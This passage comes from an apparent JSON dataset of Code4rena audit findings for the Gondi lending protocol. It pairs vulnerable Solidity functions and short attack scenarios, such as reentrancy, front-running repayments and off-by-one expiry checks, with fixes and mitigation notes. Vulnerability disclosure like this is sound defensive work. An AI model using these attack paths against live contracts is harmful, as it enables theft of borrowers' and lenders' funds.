in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/94), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/64) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/17).\n\n***\n\n",
      "summary": "\nThe report highlights a bug in the `validateOffer()` method of a contract. When this method is called, the `_outstandingValues` increases, but the `assets.balanceOf(address(this))` does not decrease immediately. This leads to an increase in the `totalAssets()` and `exchangeRate`, which can be exploited to redeem additional assets. To mitigate this, the `offer.validators` should be restricted to an empty array. The issue has been confirmed and mitigated by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/24",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35217",
      "title": "[H-15] `_baseLoanChecks()` check errors for expire",
      "impact": "HIGH",
      "content": "\n`_baseLoanChecks()` is used to check whether Loan has expired:\n\n```solidity\n    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) private view {\n        if (_loan.hash() != _loans[_loanId]) {\n            revert InvalidLoanError(_loanId);\n        }\n@>      if (_loan.startTime + _loan.duration < block.timestamp) {\n            revert LoanExpiredError();\n        }\n    }\n```\n\nThe expiration checks in liquidation are as follows:\n\n```solidity\n    function _liquidateLoan(uint256 _loanId, IMultiSourceLoan.Loan calldata _loan, bool _canClaim)\n        internal\n        returns (bool liquidated, bytes memory liquidation)\n    {\n...\n\n        uint256 expirationTime = _loan.startTime + _loan.duration;\n@>      if (expirationTime > block.timestamp) {\n            revert LoanNotDueError(expirationTime);\n        }\n```\n\nThis way, both checks pass when `block.timestamp == _loan.startTime + _loan.duration`.\n\nThis leads to the problem that a malicious attacker can perform the following steps\nwhen `block.timestamp == _loan.startTime + _loan.duration`:\n\n1.  Alice calls `liquidateLoan` (`loandId` = 1) -> success.\n    - `LoanLiquidator` generates an auction.\n    - `_loans\\[loandId = 1]` is still valid , and will only be cleared when the auction is over.\n2.  Alice call `addNewTranche` (`loandId` = 1) -> success.\n    - `_baseLoanChecks` (`loandId` = 1) will pass.\n    - delete `_loans\\[1]`;\n    - `_loans\\[2] = newLoan.hash()`.\n3.  Bidding ends, call `loanLiquidated(loandId = 1)` will fail , because `_loans[1]` has been cleared.\n\n### Impact\n\nMaliciously disrupting the end of the bidding, causing the NFT/funds to be locked.\n\n### Recommended Mitigation\n\n```diff\n\n    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) private view {\n        if (_loan.hash() != _loans[_loanId]) {\n            revert InvalidLoanError(_loanId);\n        }\n-       if (_loan.startTime + _loan.duration < block.timestamp) {\n+      if (_loan.startTime + _loan.duration <= block.timestamp) {\n            revert LoanExpiredError();\n        }\n    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/26#event-12545527904)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Strict `->` `<=`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/93), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/63) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/16).\n\n***\n\n",
      "summary": "\nThis report highlights a bug in the `_baseLoanChecks()` function, which is used to check if a loan has expired. The bug can lead to malicious attacks and locking of NFTs and funds. The bug occurs when the expiration time and current time are equal, causing both checks to pass. This can be mitigated by changing the strict comparison operator to a less than or equal to operator. The bug has been confirmed and mitigated by the Gondi team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/26",
      "tags": [],
      "finders": [
        "zhaojie",
        "minhquanym",
        "bin2chen"
      ]
    },
    {
      "id": "35216",
      "title": "[H-14] `mergeTranches()`/`refinancePartial()` lack of `nonReentrant`",
      "impact": "HIGH",
      "content": "\nIn `mergeTranches()`, the method's code implementation is as follows:\n\n```solidity\n function mergeTranches(uint256 _loanId, Loan memory _loan, uint256 _minTranche, uint256 _maxTranche)\n        external\n        returns (uint256, Loan memory)\n    {\n        _baseLoanChecks(_loanId, _loan);\n        uint256 loanId = _getAndSetNewLoanId();\n        Loan memory loanMergedTranches = _mergeTranches(loanId, _loan, _minTranche, _maxTranche);\n        _loans[loanId] = loanMergedTranches.hash();\n        delete _loans[_loanId];\n\n        emit TranchesMerged(loanMergedTranches, _minTranche, _maxTranche);\n\n        return (loanId, loanMergedTranches);\n    }\n```\n\nAs shown above, this method lacks reentrancy protection, which could allow reentrancy attacks to manipulate the `_loans[]`.\n\nExample: Suppose `_loans[1] = {NFT = 1}`\n1. Alice calls `refinanceFromLoanExecutionData(_loans\\[1],LoanExecutionData)`.\n    - `LoanExecutionData.ExecutionData.OfferExecution.LoanOffer.OfferValidator\\[0].validator` `=  CustomContract  => for callback`.\n2. `refinanceFromLoanExecutionData()` -> `_processOffersFromExecutionData()` -> `_validateOfferExecution()` -> `_checkValidators()` -> `IOfferValidator(CustomContract).validateOffer()`.\n3. In `IOfferValidator(CustomContract).validateOffer()`, call `MultiSourceLoan.mergeTranches(_loans[1])` -> pass without `nonReentrant`.\n    - `_loans\\[3] = newLoan.hash()`\n4. Return to `refinanceFromLoanExecutionData()`, will execute:\n    - `_loans\\[2] = newOtherLoan.hash()`.\n\nThere will be `_loans[2]` and `_loans[3]`, both containing `NFT=1`.\nNote: Both Loans 's lender are all himself:\n1. The user can `repayLoan(_loans[2])` and get the NFT back.\n2. Use the NFT to borrow other people's funds, e.g. to generate `_loans[100]`.\n3. `repayLoan(_loans[3])`, get NFT back.\n\n### Recommended Mitigation\n\nAdd `nonReentrant`:\n\n```diff\n function mergeTranches(uint256 _loanId, Loan memory _loan, uint256 _minTranche, uint256 _maxTranche)\n        external\n+       nonReentrant\n        returns (uint256, Loan memory)\n    {\n        _baseLoanChecks(_loanId, _loan);\n        uint256 loanId = _getAndSetNewLoanId();\n\n    function refinancePartial(RenegotiationOffer calldata _renegotiationOffer, Loan memory _loan)\n        external\n+       nonReentrant\n        returns (uint256, Loan memory)\n    {\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/27#event-12545516857)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added `nonReentrant`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/92), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/62) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/15).\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `mergeTranches()` method in a smart contract. This method does not have protection against reentrancy attacks, which could allow attackers to manipulate the `_loans[]` storage and potentially steal funds. The report provides an example of how this vulnerability could be exploited. The recommended mitigation is to add a `nonReentrant` modifier to the affected methods. This issue has been confirmed and mitigated by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/27",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35215",
      "title": "[H-13] `_processOffersFromExecutionData()` lack of check `executionData.duration<=offer.duration`",
      "impact": "HIGH",
      "content": "\n`emitLoan()` only limits `offer.duration != 0`. There's no limit in `executionData.duration<=offer.duration`.\n\n`emitLoan()` -> `_processOffersFromExecutionData()` -> `_validateOfferExecution()`\n\n```solidity\n    function _validateOfferExecution(\n        OfferExecution calldata _offerExecution,\n        uint256 _tokenId,\n        address _lender,\n        address _offerer,\n        bytes calldata _lenderOfferSignature,\n        uint256 _feeFraction,\n        uint256 _totalAmount\n    ) private {\n...\n\n@>      if (offer.duration == 0) {\n            revert ZeroDurationError();\n        }\n        if (offer.aprBps == 0) {\n            revert ZeroInterestError();\n        }\n        if ((offer.capacity > 0) && (_used[_offerer][offer.offerId] + _offerExecution.amount > offer.capacity)) { \n            revert MaxCapacityExceededError();\n        }\n\n        _checkValidators(_offerExecution.offer, _tokenId);\n    }\n```\n\nIf the `executionData.duration` time is not limited, it can lead to far exceeding the borrowing time `offer.duration`. If the `lender` is a `LoanManager`, when `repayLoan()` it can also exceed the maximum `pendingQueues`, leading to accounting issues.\n\n### Impact\n\nFar exceeding the borrowing time than `offer.duration`. If `lender` is `LoanManager` also exceeds max `pendingQueues`, causing bookkeeping issues.\n\n### Recommended Mitigation\n\nCheck `executionData.duration<=offer[n].duration`.\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/28#event-12545511916)**\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/28#issuecomment-2067729769):**\n> Sustaining high due to accounting issues.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added duration check.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/91), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/61) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/14).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `emitLoan()` function in the code. Currently, this function only limits the `offer.duration` to be different from zero, but there is no limit on the `executionData.duration` being less than or equal to `offer.duration`. This could lead to problems with borrowing time exceeding the set duration and also cause accounting issues if the lender is a LoanManager and exceeds the maximum pending queues when using the `repayLoan()` function. The recommended mitigation is to check for `executionData.duration` being less than or equal to `offer.duration`. The bug has been confirmed and mitigated by adding a duration check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/28",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35214",
      "title": "[H-12] `addNewTranche()` no authorization from borrower",
      "impact": "HIGH",
      "content": "\nFor `addNewTranche()`, the code implementation is as follows：\n\n```solidity\n    function addNewTranche(\n        RenegotiationOffer calldata _renegotiationOffer,\n        Loan memory _loan,\n        bytes calldata _renegotiationOfferSignature\n    ) external nonReentrant returns (uint256, Loan memory) {\n        uint256 loanId = _renegotiationOffer.loanId;\n\n        _baseLoanChecks(loanId, _loan);\n        _baseRenegotiationChecks(_renegotiationOffer, _loan);\n@>      _checkSignature(_renegotiationOffer.lender, _renegotiationOffer.hash(), _renegotiationOfferSignature);\n        if (_loan.tranche.length == getMaxTranches) {\n            revert TooManyTranchesError();\n        }\n\n        uint256 newLoanId = _getAndSetNewLoanId();\n        Loan memory loanWithTranche = _addNewTranche(newLoanId, _loan, _renegotiationOffer);\n        _loans[newLoanId] = loanWithTranche.hash();\n        delete _loans[loanId];\n\n        ERC20(_loan.principalAddress).safeTransferFrom(\n            _renegotiationOffer.lender, _loan.borrower, _renegotiationOffer.principalAmount - _renegotiationOffer.fee\n        );\n        if (_renegotiationOffer.fee > 0) {\n            /// @dev Cached\n            ProtocolFee memory protocolFee = _protocolFee;\n            ERC20(_loan.principalAddress).safeTransferFrom(\n                _renegotiationOffer.lender,\n                protocolFee.recipient,\n                _renegotiationOffer.fee.mulDivUp(protocolFee.fraction, _PRECISION)\n            );\n        }\n\n        emit LoanRefinanced(\n            _renegotiationOffer.renegotiationId, loanId, newLoanId, loanWithTranche, _renegotiationOffer.fee\n        );\n\n        return (newLoanId, loanWithTranche);\n    }\n```\n\nCurrently only the signature of the `lender` is checked, not the authorization of the `borrower`. Then, any `lender` can add `tranche` to any `loan` by:\n\n1. Specifying a very high apr.\n2. Specifying any `_renegotiationOffer.fee`; for example: set `_renegotiationOffer.fee==_renegotiationOffer.principalAmount`.\n\nThis doesn't make sense for `borrower`. It is recommended that only the `borrower` performs this method.\n\n### Impact\n\n`lender` can be specified to generate a malicious `tranche` to compromise `borrower`.\n\n### Recommended Mitigation\n\n```diff\n    function addNewTranche(\n        RenegotiationOffer calldata _renegotiationOffer,\n        Loan memory _loan,\n        bytes calldata _renegotiationOfferSignature\n    ) external nonReentrant returns (uint256, Loan memory) {\n        uint256 loanId = _renegotiationOffer.loanId;\n+       if (msg.sender != _loan.borrower) {\n+           revert InvalidCallerError();\n+       } \n        _baseLoanChecks(loanId, _loan);\n        _baseRenegotiationChecks(_renegotiationOffer, _loan);\n        _checkSignature(_renegotiationOffer.lender, _renegotiationOffer.hash(), _renegotiationOfferSignature);\n        if (_loan.tranche.length == getMaxTranches) {\n            revert TooManyTranchesError();\n        }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed via duplicate Issue #52](https://github.com/code-423n4/2024-04-gondi-findings/issues/52#event-12543437001)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added caller check.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/90), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/60) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/13).\n\n***\n\n",
      "summary": "\nIn the `addNewTranche()` function, the code allows any lender to add a new tranche to any loan without the authorization of the borrower. This could potentially harm the borrower. The recommended mitigation is to add a check to ensure that only the borrower can perform this action. This issue has been confirmed and mitigated by Gondi. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/29",
      "tags": [],
      "finders": [
        "zhaojie",
        "minhquanym",
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35213",
      "title": "[H-11] Incorrect protocol fee implementation results in `outstandingValues` to be mis-accounted in Pool.sol",
      "impact": "HIGH",
      "content": "\nThe vulnerability is that `LiquidationDistributer::_handleLoanMangerCall` [hardcodes `0` as protocol fee](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/LiquidationDistributor.sol#L117) when calling `LoanManager(_tranche.lender).loanLiquidation()`.\n\n```solidity\n//src/lib/LiquidationDistributor.sol\n    function _handleLoanManagerCall(IMultiSourceLoan.Tranche calldata _tranche, uint256 _sent) private {\n        if (getLoanManagerRegistry.isLoanManager(_tranche.lender)) {\n            LoanManager(_tranche.lender).loanLiquidation(\n                _tranche.loanId,\n                _tranche.principalAmount,\n                _tranche.aprBps,\n                _tranche.accruedInterest,\n   |>           0,  //@audit this should be the actual protocol fee fraction\n                _sent,\n                _tranche.startTime\n            );\n        }\n    }\n```\n\n`_handleLoanManagerCall()` will be called as part of the flow to [distribute proceeds](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionLoanLiquidator.sol#L288) from a liquidation.\n\nWhen protocol fee is hardcoded `0`, in the [`Pool::loanliquidation`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/LiquidationDistributor.sol#L112) call, [`netApr` will not account for protocol fee fraction](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L458) which will [inflate the `_apr` used to offset `_outstandingValues.sumApr`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L751), a state variable that accounts for the total annual apr of outstanding loans.\n\n```solidity\n//src/lib/pools/Pool.sol\n        OutstandingValues memory __outstandingValues,\n        uint256 _principalAmount,\n        uint256 _apr,\n        uint256 _interestEarned\n    ) private view returns (OutstandingValues memory) {\n...\n         //@audit inflated _apr will offset __outstandingValues.sumApr to an incorrect lower value, causing accounting error\n|>        __outstandingValues.sumApr -= uint128(_apr * _principalAmount);\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L751>\n\nFor comparison, when a loan is created ([`pool::validateOffer`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L760)), the actual protocol fee ([`protocolFee.fraction`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L1008)) will be passed, and `__outstandingValues.sumApr` will be added with the [post-fee apr value](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L509), instead of the before-fee apr.\n\nState accounting `__outstandingValues` will be incorrect, all flows that consume `__outstandingValues.sumApr` when calculating interests will be affected.\n\n### Recommended Mitigation Steps\n\nUser `_loan.protocolFee `instead of `0`.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/33#issuecomment-2067353471):**\n > Messes up with accounting, I think this is a high one.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Passing protocol fee.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/89), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/59) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/12).\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `LiquidationDistributer` contract, where a hardcoded value of `0` is used as the protocol fee when calling the `loanLiquidation()` function in the `LoanManager` contract. This leads to an incorrect calculation of the `netApr` value, which in turn affects the `sumApr` state variable used for accounting. This can cause an accounting error and affect all flows that rely on the `sumApr` value for calculating interests. The recommended mitigation is to use the `protocolFee` value instead of `0` when calling the `loanLiquidation()` function. The bug has been confirmed and mitigated by the Gondi team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/33",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35212",
      "title": "[H-10] The attackers front-running `repayloans` so that the debt cannot be repaid",
      "impact": "HIGH",
      "content": "\nThe attackers make it impossible for borrowers to repay their debts, and the collateral is liquidated when the debts mature.\n\n### Proof of Concept\n\n`repayLoan` needs to check the `loanId`; if the id is inconsistent it will revert.\n\n```solidity\n    function repayLoan(LoanRepaymentData calldata _repaymentData) external override nonReentrant {\n        uint256 loanId = _repaymentData.data.loanId;\n        Loan calldata loan = _repaymentData.loan;\n        .....\n@>      _baseLoanChecks(loanId, loan);\n        .....\n    }\n    \n    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) private view {\n        if (_loan.hash() != _loans[_loanId]) {\n            revert InvalidLoanError(_loanId);\n        }\n        if (_loan.startTime + _loan.duration < block.timestamp) {\n            revert LoanExpiredError();\n        }\n    }\n```\n\nThe problem is that `_loans[_loanId]` can change; for example, when `mergeTranches` deletes the old `loanId` and writes the new one:\n\n```solidity\n    _loans[loanId] = loanMergedTranches.hash();\n    delete _loans[_loanId];\n```\n\nAn attacker can use the `front-running` attack method. When `repayLoan` is called, execute the `mergeTranches` function in advance, and make the id in `_loans` updated. In this case, the `repayLoan` execution will fail due to inconsistent `_loanId`.\n\nIf the attacker keeps using this attack, the borrower's debt will not be repaid; eventually causing the collateral to be liquidated.\n\nIn addition to the `mergeTranches` function, the attacker can also call `addNewTranche`, and the borrower can also call the refinance-related function, again causing `_loanId` to be updated.\n\nAn attacker can also use the same method to attack `refinance` related functions, making refinance unable to execute. An attacker can also use the same method to attack the `liquidateLoan` function, making it impossible for debts to be cleared.\n\n### Tools Used\n\nVScode\n\n### Recommended Mitigation Steps\n\nDo not delete `_loanId`.\n\n### Assessed type\n\nDoS\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2061734850):**\n > I have some doubts about severity, since this requires too many resources from the attacker (see [here](https://github.com/code-423n4/org/issues/143)), and the `addNewTranche()` requires the lender's signature (and when using `mergeTranches()` alone the attacker would eventually run out of tranches to merge).\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2067349645):**\n > I think this is low (agree with judge for those reasons).\n\n**[0xA5DF (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2067728846):**\n > I think there are too many limitations on this one, and the motivation for the attacker isn't very high - they're not going to get the entire principal from this.\n\n**[0xend (Gondi) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2067773961):**\n > Given the limit on tranches the attacker can only run this a handful of times.\n\n**[zhaojie (warden) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2069358048):**\n > I think it's a `high risk`, because anyone can be an attacker, so Lender can be an attacker.\n>\n> If the lender does not want the borrower to repay the debt, the lender can use `addNewTranche/mergeTranches` and to attack `repayLoans` and make the borrower's loan impossible to repay, especially when the loan is about to expire.\n> This causes the borrower's NFT to be loss, so it would have a high impact.\n> \n> When `_liquidateLoan`, if `_canClaim == true`, the borrower can get the NFT directly:\n>\n> ```solidity\n>     function _liquidateLoan....{\n>        ....\n>         if (_canClaim) {\n>             ERC721(_loan.nftCollateralAddress).transferFrom(\n>                 address(this), _loan.tranche[0].lender, _loan.nftCollateralTokenId\n>             );\n>             emit LoanForeclosed(_loanId);\n> \n>             liquidated = true;\n>         } \n>     ....\n>     }\n> \n>      function liquidateLoan(uint256 _loanId, Loan calldata _loan)...  {\n>        .....\n>         (bool liquidated, bytes memory liquidation) = _liquidateLoan(\n>             _loanId, _loan, _loan.tranche.length == 1 && !getLoanManagerRegistry.isLoanManager(_loan.tranche[0].lender)\n>         );\n>        ......\n>      }\n> ```\n> \n> An attacker/lender can use `mergeTranches` to make `_loan.tranche.length == 1`. The key issue is that `loanId` will be reset.\n\n**[0xA5DF (judge) increased severity to High and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2069536102):**\n > You're right that the lender has a high motivation to execute this attack. You're also right that when the borrower attempts to repay close to the expiry time this attack becomes feasible.\n >\n> While some conditions are required in order for this to work, it still seems pretty likely to happen. Due to those reasons I'm reinstating high severity.\n> \n> Side note: I think that a better mitigation would be to not allow functions that change the `loanID` to run near the expiry time.\n\n**[0xend (Gondi) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/35#issuecomment-2098898343):**\n > No specific PR here since it's addressed when limiting `addNewTranche` to only be able to be called by the borrower and checking in `refinancePartial` that there's at least one tranche being refinanced. This ends up limiting the number of times a loan can be locked by the lender (tranches are locked for some time after a refinance for future ones).\n\n***\n\n",
      "summary": "\nThe bug report discusses a potential attack on the code that handles loan repayments in a decentralized lending platform. The attack involves manipulating the loan ID in a way that makes it impossible for borrowers to repay their debts, leading to the liquidation of their collateral. This can be achieved by using a technique called \"front-running\" where the attacker executes a function before the borrower, causing the loan ID to be inconsistent. This attack can also be carried out by manipulating other related functions, such as merging loan tranches or refinancing the loan. The severity of this bug was initially debated, with some experts considering it to be a low risk due to certain limitations on the attacker's resources and motivation. However, it was ultimately classified as a high risk due to the potential impact on borrowers and the possibility of lenders intentionally using this attack to harm borrowers. The recommended mitigation step is to not allow functions that change the loan ID to be executed close to the loan's expiry time. This issue has been addressed by limiting certain functions and checking for specific conditions before allowing them to be executed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/35",
      "tags": [],
      "finders": [
        "zhaojie",
        "minhquanym"
      ]
    },
    {
      "id": "35211",
      "title": "[H-09] Incorrect accounting of `_pendingWithdrawal` in `queueClaiming` flow",
      "impact": "HIGH",
      "content": "\nIncorrect accounting of `_pendingWithdrawal` in `queueClaiming` flow, funds received from a previous queue index will be lost.\n\n### Proof of Concept\n\nIn Pool.sol's `queueClaimAll()`, each queue's received funds `getTotalReceived[_idx]` (total returned funds from loans for that queue) will be distributed to all newer queues in a for-loop.\n\nThere are two for-loops in this flow. [First for-loop](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L692) iterate through each `pendingWithdrawal` index to get the received funds for that queue index (`getTotalReceived[_idx]`). [Second for-loop](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L662) iterates through each queue index again to distribute funds from `_idx`.\n\nThe problem is in the second for-loop, `_pendingWithdrawal[secondIdx]` will not accumulate distributed funds from previous queue indexes, instead it erases the value from previous loops and only records the last queue's received funds.\n\n```solidity\n//src/lib/pools/Pool.sol\n    function _updatePendingWithdrawalWithQueue(\n        uint256 _idx,\n        uint256 _cachedPendingQueueIndex,\n        uint256[] memory _pendingWithdrawal\n    ) private returns (uint256[] memory) {\n        uint256 totalReceived = getTotalReceived[_idx];\n        uint256 totalQueues = getMaxTotalWithdrawalQueues + 1;\n...\n        getTotalReceived[_idx] = 0;\n...\n        for (uint256 i; i < totalQueues;) {\n...\n              //@audit this should be _pendingWithdraw[secondIdx] += pendingForQueue; Current implementation directly erases `pendingForQueue` value distributed from other queues. \n|>            _pendingWithdrawal[secondIdx] = pendingForQueue;\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L678>\n\nNote that `getTotalReceived[_idx]` will be cleared before the for-loop (`getTotalReceived[_idx] = 0`), meaning that the erased `pendingForQueue` values from previous loops cannot be recovered. `_pendingWithdrawal` will be incorrect.\n\n### Recommended Mitigation Steps\n\nChange into `_pendingWithdrawal[secondIdx] + = pendingForQueue;`.\n\n### Assessed type\n\nError\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/46#event-12543628520)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Missing `+`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/49), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/58) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/10).\n\n***\n\n",
      "summary": "\nThis bug report is about an error in the `queueClaiming` flow of the Pool.sol contract. Due to a mistake in the code, funds received from a previous queue index will be lost. This can lead to incorrect accounting of the `_pendingWithdrawal` variable. The problem lies in the second for-loop, where the value of `_pendingWithdrawal[secondIdx]` is not properly accumulated, causing it to erase the value from previous loops. The recommended mitigation step is to change the code to `_pendingWithdrawal[secondIdx] += pendingForQueue`. This bug has been confirmed and mitigated by the Gondi team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/46",
      "tags": [],
      "finders": [
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35210",
      "title": "[H-08] Incorrect circular array check in `_updatePendingWithdrawalWithQueue` flow, causing received funds to be added to the wrong queues",
      "impact": "HIGH",
      "content": "\nIn Pool.sol, `queueClaimAll` flow will transfer received funds (returned funds from loans) for each queue to newer queues.\n\nReceived funds for a given queue are intended to be [distributed to newer queues](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L656-L661):\n\n>        /// @dev We go from idx to newer queues. Each getTotalReceived is the total        \n>        /// returned from loans for that queue. All future queues/pool also have a piece of it.\n>        /// X_i: Total received for queue `i`\n>        /// X_1  = Received * shares_1 / totalShares_1\n>        /// X_2 = (Received - (X_1)) * shares_2 / totalShares_2 ...\n>        /// Remainder goes to the pool.\n\nThis logic is implemented in `_updatePendingWithdrawalWithQueue()`. Due to queue arrays are circular, the array index never exceeds `getMaxTotalWithdrawalQueues` and will restart from `0`.\n\n`% totalQueues` should be used when checking array indexes in most cases. However, [in the queue index for-loop](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L672C17-L672C57), `if (secondIdx == _cachedPendingQueueIndex + 1) {break;}` is used to break the loop instead of `secondIdx == 